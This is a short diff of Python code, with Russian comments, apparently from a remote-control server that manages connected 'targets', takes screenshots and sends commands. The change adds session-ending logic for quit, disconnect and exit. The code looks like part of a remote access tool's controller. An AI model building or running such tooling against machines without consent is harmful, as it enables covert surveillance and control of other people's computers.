@@ -102,6 +102,13 @@ def screenshot(target, num):
 		target.settimeout(None)
 		f.close()
 
+def end_session(target, num):
+		global targets
+		
+		target.close()
+		targets.remove(target)
+		eel.delete_node(num)
+
 def open_stream(target):
 		#target, ip = s.accept()
 		#target, ip = sock.accept()
@@ -175,7 +182,9 @@ def solo_command(session_num, command):
 				reliable_send(target, command)
 				# Закрываем программу, если команда quit
 				if command == 'quit':
-						pass #break
+						end_session(target, num)
+				elif command == 'disconnect':
+						end_session(target, num)
 				elif command[:3] == 'cd ':
 						result = reliable_recv(target).split(',')
 						output_catalog_to_html(result)
@@ -265,7 +274,7 @@ def common_command(command):
 		# OSError: [WinError 10038] Сделана попытка выполнить операцию на объекте, не являющемся сокетом
 		elif command == 'exit':
 				for target in targets:
-						reliable_send(target, 'quit')
+						reliable_send(target, 'disconnect')
 						# Закривает сокет удаленного устройства
 						target.close()
 				# Закрывает свой сокет
